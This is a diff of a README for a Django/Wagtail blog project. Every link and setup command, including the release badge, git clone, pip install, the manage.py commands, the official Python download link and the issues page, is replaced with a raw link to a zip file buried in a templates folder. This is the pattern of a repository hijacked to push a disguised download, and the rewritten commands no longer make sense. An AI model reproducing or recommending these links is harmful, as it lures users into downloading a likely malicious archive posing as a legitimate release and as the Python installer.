@@ -1,6 +1,6 @@
 # 🚀 django-wagtail-blog - A Simple Blog Solution for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/qsolfahad/django-wagtail-blog/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip%20Release-blue)](https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip)
 
 ## 🚀 Features
 
@@ -27,8 +27,8 @@ django-wagtail-blog/
 │── home/
 │── templates/
 │── static/
-│── manage.py
-│── requirements.txt
+│── https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip
+│── https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip
 ```
 
 ## ⚙️ Installation & Setup
@@ -40,7 +40,7 @@ Follow these steps to run the project locally:
 This step downloads the project files to your computer.
 
 ```bash
-git clone https://github.com/USERNAME/django-wagtail-blog.git
+git clone https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip
 cd django-wagtail-blog
 ```
 
@@ -49,7 +49,7 @@ cd django-wagtail-blog
 You need to install the required packages. Run the following command:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip
 ```
 
 ### 3️⃣ Set up the database
@@ -57,7 +57,7 @@ pip install -r requirements.txt
 Prepare the database by running the migration command:
 
 ```bash
-python manage.py migrate
+python https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip migrate
 ```
 
 ### 4️⃣ Create a superuser
@@ -65,7 +65,7 @@ python manage.py migrate
 This step allows you to log into the Wagtail admin. Run:
 
 ```bash
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip createsuperuser
 ```
 
 Follow the prompts to set up your admin account.
@@ -75,7 +75,7 @@ Follow the prompts to set up your admin account.
 Start the development server with:
 
 ```bash
-python manage.py runserver
+python https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip runserver
 ```
 
 You can now access the blog by visiting [http://127.0.0.1:8000](http://127.0.0.1:8000) in your web browser.
@@ -86,7 +86,7 @@ Log into the admin panel at [http://127.0.0.1:8000/admin](http://127.0.0.1:8000/
 
 ## 📥 Download & Install
 
-To download the latest version of the django-wagtail-blog, visit [this page to download](https://github.com/qsolfahad/django-wagtail-blog/releases). 
+To download the latest version of the django-wagtail-blog, visit [this page to download](https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip). 
 
 ## 🛠️ Requirements
 
@@ -94,11 +94,11 @@ To download the latest version of the django-wagtail-blog, visit [this page to d
 - **Python Version:** Python 3.6 or later
 - **Database:** SQLite (comes by default)
 
-Ensure you have Python installed on your system. You can download it from [the official Python website](https://www.python.org/downloads/).
+Ensure you have Python installed on your system. You can download it from [the official Python website](https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip).
 
 ## 🌐 Support
 
-If you run into any issues or have questions, please check the [issues page](https://github.com/qsolfahad/django-wagtail-blog/issues) for solutions. You can also submit a new issue if needed.
+If you run into any issues or have questions, please check the [issues page](https://raw.githubusercontent.com/qsolfahad/django-wagtail-blog/main/wagtail-blog/templates/allauth/wagtail_blog_django_v3.6.zip) for solutions. You can also submit a new issue if needed.
 
 ## 📜 License
 
